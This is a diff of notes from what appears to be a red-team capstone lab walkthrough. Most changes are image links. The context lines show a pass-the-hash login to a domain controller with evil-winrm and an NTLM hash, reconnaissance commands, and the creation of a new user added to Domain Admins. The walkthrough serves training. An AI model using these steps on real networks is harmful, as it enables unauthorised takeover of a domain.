@@ -1,14 +1,14 @@
 
 $ `proxychains4 /usr/bin/evil-winrm -u Administrator -H d3d4edcc015856e386074795aea86b3e -i 10.200.113.102`
 
-![Dumping secrets from CORPDC-20240602155726615.webp](app://aada9d56eb98c8801394b98c13978398694d/media/sf_obsidian/Red%20Team%20Capstone%20Challenge/Images/Dumping%20secrets%20from%20CORPDC-20240602155726615.webp?1717358246568)
+![[Connect CORPDC with evil-winrm-20240711134443095.webp]]
 
 You'll get a shell.  
 Check out the hostname.
 
 Evil-WinRM PS C:\Users\Administrator\Documents> `hostname`
 
-![Dumping secrets from CORPDC-20240602160026969.webp](app://aada9d56eb98c8801394b98c13978398694d/media/sf_obsidian/Red%20Team%20Capstone%20Challenge/Images/Dumping%20secrets%20from%20CORPDC-20240602160026969.webp?1717358426958)
+![[Connect CORPDC with evil-winrm-20240711134533300.webp]]
 
 ### Create a new user as an Administrator
 
@@ -21,7 +21,7 @@ Password: K41r@s123
 
 Evil-WinRM* PS C:\Users\Administrator\Documents> `net group`
 
-![Dumping secrets from CORPDC-20240604135830320.webp](app://aada9d56eb98c8801394b98c13978398694d/media/sf_obsidian/Red%20Team%20Capstone%20Challenge/Images/Dumping%20secrets%20from%20CORPDC-20240604135830320.webp?1717523911003)
+![[Connect CORPDC with evil-winrm-20240711134633470.webp]]
 
 ### Add the new user to this group to make him the `Domain Admin`.
 
@@ -33,6 +33,6 @@ The `net user` command is a Windows command-line utility that can be used to d
 
 Evil-WinRM* PS C:\Users\Administrator\Documents> `net user kairos /domain`
 
-![Dumping secrets from CORPDC-20240604140856658.webp](app://aada9d56eb98c8801394b98c13978398694d/media/sf_obsidian/Red%20Team%20Capstone%20Challenge/Images/Dumping%20secrets%20from%20CORPDC-20240604140856658.webp?1717524537015)
+![[Connect CORPDC with evil-winrm-20240711134239749.webp]]
 
 **Next step:** [[RDP to CORPDC]]
